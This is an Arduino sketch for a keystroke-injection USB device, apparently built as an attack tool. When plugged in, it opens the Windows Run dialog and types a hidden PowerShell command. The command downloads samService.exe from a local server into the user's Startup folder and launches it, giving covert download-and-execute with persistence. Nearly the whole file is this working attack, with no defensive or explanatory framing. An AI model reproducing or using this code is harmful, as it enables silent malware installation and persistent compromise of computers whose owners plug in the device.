#include <Keyboard.h>



void RUN(char * cmd)
{
  
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(100);

 
  Keyboard.print(cmd);


  delay(1000);

  Keyboard.press(KEY_RETURN);

  Keyboard.releaseAll();




}

void setup()
{

  Keyboard.begin(); // 키보드 활성화
  
  Serial.begin(9600); // 시리얼 모니터

  delay(1000);
  
  RUN("%windir%\\system32\\cmd.exe /c powershell -w hidden \"$R = $env:APPDATA+\'\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\samService.exe\';(New-Object Net.WebClient).DownloadFile(\'http://127.0.0.1:1479/samService.exe\', $R);start $R\"");
  
}

void loop()
{
 
  
  Serial.write("Hello?");
  
  delay(15000);
}
